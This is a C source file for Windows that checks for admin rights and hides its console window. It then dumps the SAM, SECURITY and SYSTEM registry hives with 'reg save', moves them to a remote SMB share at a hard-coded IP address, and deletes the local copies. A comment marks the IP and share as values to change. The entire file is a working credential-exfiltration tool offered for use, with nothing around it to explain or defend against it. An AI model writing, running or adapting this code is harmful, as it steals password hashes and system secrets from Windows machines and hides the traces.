#include <windows.h>
#include <stdlib.h>

int main() {
    // Admin check
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return 1;
    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    BOOL isAdmin = GetTokenInformation(hToken, TokenElevation, &elevation, size, &size);
    CloseHandle(hToken);
    if (!isAdmin || !elevation.TokenIsElevated) return 1;

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Save hives
    system("reg save hklm\\sam C:\\sam.save /y >nul 2>&1");
    system("reg save hklm\\security C:\\security.save /y >nul 2>&1");
    system("reg save hklm\\system C:\\system.save /y >nul 2>&1");

    // MOVE commands - CHANGE IP AND SHARE HERE
    system("move C:\\sam.save \\\\192.168.223.129\\CompData\\sam.save >nul 2>&1");
    system("move C:\\security.save \\\\192.168.223.129\\CompData\\security.save >nul 2>&1");
    system("move C:\\system.save \\\\192.168.223.129\\CompData\\system.save >nul 2>&1");

    // Cleanup
    system("del C:\\sam.save >nul 2>&1");
    system("del C:\\security.save >nul 2>&1");
    system("del C:\\system.save >nul 2>&1");

    return 0;
}